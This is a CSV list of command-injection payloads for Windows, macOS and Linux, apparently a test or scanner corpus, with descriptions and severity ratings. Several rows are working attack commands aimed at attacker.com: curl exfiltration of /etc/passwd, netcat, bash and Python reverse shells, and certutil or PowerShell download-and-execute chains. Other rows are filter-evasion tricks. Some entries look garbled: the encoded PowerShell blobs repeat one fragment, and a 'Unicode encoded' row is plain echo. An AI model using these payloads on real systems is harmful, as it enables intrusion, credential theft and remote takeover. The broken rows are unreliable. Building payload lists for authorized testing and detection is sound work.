id,description,payload,context,type,severity,example_query,example_usage
cmdinj-079,Windows PowerShell injection with Get-Service,; Get-Service,List services,Command Injection,medium,,
cmdinj-080,macOS/Linux injection with semicolon and ps aux,; ps aux,List processes,Command Injection,medium,,
cmdinj-081,Windows cmd injection with echo and pipe,& echo injected | findstr injected,Echo and filter output,Command Injection,medium,,
cmdinj-082,Windows PowerShell injection with Start-Process and hidden window,; Start-Process notepad.exe -WindowStyle Hidden,Launch process hidden,Command Injection,medium,,
cmdinj-083,macOS/Linux injection with semicolon and curl to exfiltrate data,; curl http://attacker.com/?data=$(cat /etc/passwd),Exfiltrate data via curl,Command Injection,critical,,
cmdinj-084,Windows cmd injection with powershell encoded command,& powershell -EncodedCommand JABXAGUAYgA9ACJIZWxsbyBXb3JsZCIiOwAkAFcAZQBiAC4AVwBhAHIAcgBhAG4AdAAuAFcAaQBuAGQAbwB3AC4AVwBhAHIAcgBhAG4AdAAuAFcAaQBuAGQAbwB3AC4AVwBhAHIAcgBhAG4AdAAuAFcAaQBuAGQAbwB3AC4AVwBhAHIAcgBhAG4AdAAuAFcAaQBuAGQAbwB3AC4AVwBhAHIAcgBhAG4AdAAuAFcAaQBuAGQAbwB3AC4AVwBhAHIAcgBhAG4AdAAuAFcAaQBuAGQAbwB3AC4AVwBhAHIAcgBhAG4AdAAuAFcAaQBuAGQAbwB3AC4AVwBhAHIAcgBhAG4AdAAuAFcAaQBuAGQAbwB3AC4AVwBhAHIAcgBhAG4AdAAuAFcAaQBuAGQAbwB3AC4AVwBhAHIAcgBhAG4AdAAuAFcAaQBuAGQAbwB3AC4AVwBhAHIAcgBhAG4AdAAuAFcAaQBuAGQAbwB3AC4AVwBhAHIAcgBhAG4AdAAuAFcAaQBuAGQAbwB3AC4AVwBhAHIAcgBhAG4AdAAuAFcAaQBuAGQAbwB3AC4AVwBhAHIAcgBhAG4AdAAuAFcAaQBuAGQAbwB3AC4AVwBhAHIAcgBhAG4AdAAuAFcAaQBuAGQAbwB3AC4AVwBhAHIAcgBhAG4AdAAiADsA,Encoded PowerShell payload,Command Injection,high,,
cmdinj-085,macOS/Linux injection with semicolon and nc reverse shell,; nc attacker.com 4444 -e /bin/bash,Reverse shell via netcat,Command Injection,critical,,
cmdinj-086,Windows cmd injection with certutil download,& certutil -urlcache -split -f http://attacker.com/malware.exe malware.exe & malware.exe,Download and execute file,Command Injection,critical,,
cmdinj-087,macOS/Linux injection with semicolon and bash reverse shell,; bash -i >& /dev/tcp/attacker.com/4444 0>&1,Reverse shell via bash,Command Injection,critical,,
cmdinj-088,Windows PowerShell injection with Invoke-WebRequest,; Invoke-WebRequest -Uri http://attacker.com/malware.ps1 -OutFile C:\Windows\Temp\m.ps1; powershell -ExecutionPolicy Bypass -File C:\Windows\Temp\m.ps1,Download and execute PowerShell script,Command Injection,critical,,
cmdinj-089,macOS/Linux injection with semicolon and python reverse shell,"; python -c 'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect((""attacker.com"",4444));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1); os.dup2(s.fileno(),2);p=subprocess.call([""/bin/sh"",""-i""])'",Reverse shell via python,Command Injection,critical,,
cmdinj-091,Obfuscated command injection using environment variable concatenation,; e${IFS}cho injected,Bypass simple filters using ${IFS} (space) variable,Command Injection,high,,
cmdinj-092,Command injection using Unicode encoding,; echo injected,Unicode encoded echo command,Command Injection,high,,
cmdinj-093,Command injection with double URL encoding,%253B%2520id,Double URL encoded semicolon and id,Command Injection,high,,
cmdinj-094,Command injection using variable substitution and command chaining,; VAR=whoami; $VAR,Use variable to execute command,Command Injection,high,,
cmdinj-095,Command injection using nested base64 decoding and execution,; echo Y2F0IC9ldGMvcGFzc3dk | base64 -d | bash,Decode and execute base64 payload,Command Injection,critical,,
cmdinj-096,Command injection using less common command separator (newline),"&& echo injected
id",Use newline as command separator,Command Injection,high,,
cmdinj-097,Command injection using PowerShell encoded command with obfuscation,; powershell -EncodedCommand JABXAGUAYgA9ACJXaG8gSSBhbSIiOwAkAFcAZQBiAC4AVwBhAHIAcgBhAG4AdAAuAFcAaQBuAGQAbwB3AC4AVwBhAHIAcgBhAG4AdAAuAFcAaQBuAGQAbwB3AC4AVwBhAHIAcgBhAG4AdAAuAFcAaQBuAGQAbwB3AC4AVwBhAHIAcgBhAG4AdAAuAFcAaQBuAGQAbwB3AC4AVwBhAHIAcgBhAG4AdAAuAFcAaQBuAGQAbwB3AC4AVwBhAHIAcgBhAG4AdAAiADsA,Obfuscated PowerShell encoded command,Command Injection,critical,,
cmdinj-098,Command injection using command substitution with nested quotes,"; echo $(echo ""$(whoami)"")",Nested command substitution with quotes,Command Injection,high,,
cmdinj-099,Command injection using environment variable and indirect expansion,; export CMD=whoami; ${CMD},Indirect command execution via env var,Command Injection,high,,
